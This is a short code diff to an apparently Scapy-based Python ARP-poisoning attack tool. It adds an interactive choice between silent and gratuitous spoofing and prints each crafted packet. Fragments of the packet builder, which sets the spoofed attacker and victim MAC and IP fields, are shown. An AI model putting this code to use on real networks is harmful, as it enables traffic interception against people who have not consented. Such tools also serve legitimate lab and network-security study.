@@ -27,7 +27,7 @@ ONE_WAY_TOKEN = "__ONE_WAY_TOKEN__"
 ### FUNCTIONS ###
 
 # Main function that runs the ARP attack
-def arp_spoofing(gratuitous):
+def arp_spoofing():
     # clear terminal and begin keeping track of previous displayed text for UI
     spoof.clear()
     previous_tuples = []
@@ -39,6 +39,9 @@ def arp_spoofing(gratuitous):
 
     previous_tuples.append(["Chosen attack: ARP Poisoning.", 0])
     previous_tuples.append(["-----------------------------"])
+
+    # choose if attack should be silent or gratuitous
+    gratuitous = spoof.choose_gratuitous(previous_tuples)
 
     # allow the user to choose an interface for the attack
     iface, previous_tuples = spoof.get_interface(previous_tuples)
@@ -242,5 +245,6 @@ def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type, gratuito
         packet[ARP].hwdst = macVictim
         packet[ARP].pdst  = ipVictim
         packet[ARP].op = pkt_type # 1 = request, 2 = reply
+    print(packet.show())
 
     return packet
